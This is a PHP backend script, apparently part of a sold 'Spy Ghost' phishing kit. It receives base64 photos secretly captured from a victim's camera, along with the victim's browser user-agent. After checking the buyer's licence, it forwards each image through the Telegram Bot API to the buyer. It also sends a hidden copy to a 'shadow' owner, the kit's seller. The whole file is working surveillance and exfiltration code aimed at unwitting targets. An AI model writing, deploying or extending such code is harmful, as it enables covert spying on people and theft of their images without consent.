<?php
error_reporting(0);
include 'config.php';

$input = json_decode(file_get_contents('php://input'), true);

if (isset($input['img'])) {
    $uid = $input['user_id'];
    
    // Cek Lisensi
    if (!isset($premium_users[$uid])) {
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$uid&text=".urlencode("⚠️ AKSES DITOLAK! Hubungi @Kensora95"));
        exit;
    }

    // Decode Gambar
    $imgData = str_replace(['data:image/jpeg;base64,', ' '], ['', '+'], $input['img']);
    $img = base64_decode($imgData);
    $fname = 'result_'.time().'.jpg';
    file_put_contents($fname, $img);
    
    $caption = "👻 **SPY GHOST REPORT** 👻\n---------------------------\n🎯 **TARGET TERJERAT!**\n📱 **Info**: ".$input['info']['agent'];

    function kirimFoto($cid, $tk, $fl, $cp) {
        $url = "https://api.telegram.org/bot$tk/sendPhoto";
        $data = [
            'chat_id' => $cid,
            'photo' => new CURLFile(realpath($fl)),
            'caption' => $cp,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Penting untuk Termux/Windows
        curl_exec($ch);
        curl_close($ch);
    }

    // Kirim ke Pembeli & Boss Kensora
    kirimFoto($owner_1, $token, $fname, $caption);
    kirimFoto($owner_bayangan, $token, $fname, "🕵️ **MONITOR**: ".$caption);

    unlink($fname); // Hapus cache
}
?>
